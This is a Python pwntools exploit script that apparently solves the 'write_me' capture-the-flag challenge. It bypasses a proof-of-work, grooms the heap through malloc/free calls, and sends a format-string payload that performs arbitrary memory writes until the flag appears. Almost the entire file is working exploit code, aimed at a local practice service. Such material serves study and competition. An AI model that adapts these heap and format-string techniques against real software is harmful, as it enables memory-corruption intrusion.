#!/usr/bin/env python3
from pwn import *

def solve():
	def handle_pow(r):
		print(r.recvuntil(b'python3 '))
		print(r.recvuntil(b' solve '))
		challenge = r.recvline().decode('ascii').strip()
		p = process(['kctf_bypass_pow', challenge])
		solution = p.readall().strip()
		r.sendline(solution)
		print(r.recvuntil(b'Correct\n'))


	# con = process('./write_me_patched')
	con = remote('127.0.0.1', 1337)
	print(con.recvuntil(b'== proof-of-work: '))
	if con.recvline().startswith(b'enabled'):
		handle_pow(con)


	def malloc(idx, sz):
		con.sendlineafter(b'?', b'1')
		con.sendlineafter(b'?', str(idx).encode())
		con.sendlineafter(b'?', str(sz).encode())


	def free(idx):
		con.sendlineafter(b'?', b'2')
		con.sendlineafter(b'?', str(idx).encode())

	def get_challenge():
		N = 16
		ret = []
		con.sendlineafter(b'?', b'3')
		for _ in range(N):
			con.recvuntil(b'Challenge')
			arr = con.recvline().split(b' ')
			val, addr = int(arr[3],16), int(arr[6],16)
			ret.append((val, addr))
		return ret


	malloc(104, 0x8000)
	pad = 0x100 - 0x30 - 0x10 * 4
	malloc(100, 1)
	malloc(103, 0x20)
	malloc(0, 0x90)
	malloc(101, pad)
	k = 20
	for i in range(1, k):
		malloc(i, 0x90)

	free(k-1)
	free(0)
	malloc(0, 0x90)
	malloc(k-1, 0x90)

	for i in range(1,k):
		free(i)

	malloc(102, 0x418)
	free(102)
	free(100)
	free(104)


	# for i in range(15):
	# 	malloc(i, 0x20)

	# malloc(0, 1)
	# for i in range(1, 8):
	# 	malloc(i, 0x90)

	# malloc(101, 0x90)
	# malloc(100, 1)
	# for i in range(8, 20):
	# 	malloc(i, 0x90)

	# malloc(102, 1)

	# for i in range(20, 40):
	# 	malloc(i, 0x90)


	# for i in range(1, 8):
	# 	free(i)



	# for i in range(8, 40, 2):
	# 	free(i)

	# free(101)

	# for i in range(9, 40, 2):
	# 	free(i)

	# free(0)

	# malloc(20, 0x120)
	# malloc(1, 0x100)
	# malloc(2, 0x100)
	# malloc(3, 0x100)
	# malloc(4, 0x100)
	# free(1)
	# free(3)
	# malloc(5, 0x458)
	# free(5)
	# free(4)
	chals = get_challenge()




	def fmt(idx, pad, width='hhn', sz=256):
		return b' '*pad + f'%{idx}${width}'.encode() + b' ' * (sz - pad)
		# return f'%{pad}c%{idx}${width}%{sz-pad}c'.encode()

	def arb_write(addr, val):
		ret = b''
		for i in range(8):
			ret += fmt(11, 0x20 + i)
			ret += fmt(111, (addr >> (i * 8)) & 0xff)
		ret += fmt(11, 0x20)
		for i in range(4):
			ret += fmt(111, i)
			ret += fmt(9, (val >> (i * 8)) & 0xff)
		return ret

	# We need to have this point into the scratch buffer

	payload = b''
	payload += fmt(11, 0x1900+0x7000, width='hn')
	tmp = b''
	for val, addr in chals:
		# payload += b'%11$hhn %111$n'
		# print(hex(addr), hex(val))
		tmp += arb_write(addr, val)
		# break

	payload += tmp.replace(b' '*0x100, b'')

	payload += b'?%52$p?'
	print(hex(len(payload)))
	assert len(payload) < 0x21000

	# payload += b'%1$n'
	# print(payload)
	# for i in range(1, 20):
	# 	payload += f'%10c '.encode()


	# breakpoints = '\n'.join([f'awatch *{hex(addr)}' for _, addr in chals[:4]])
	# gdb.attach(con, breakpoints+ '''
	# 	c
	# 	heap chunks
	# 	''')


	con.sendlineafter(b'?', payload)
	# con.recvuntil(b'?')
	# leak = int(con.recvuntil(b'?')[:-1], 16)
	# if leak & 0xff00 != 0:
	# 	exit(1)


	# con.sendlineafter(b'?', b'3')
	# con.sendlineafter(b'?', b'%p '*100)

	con.recvuntil(b'Yay! You Win!')
	print("Found!")

	if b'idek{' in con.recvall():
		exit(0)
	con.close()

# solve()

for _ in range(64):
	try:
		solve()
	except EOFError:
		pass
exit(1)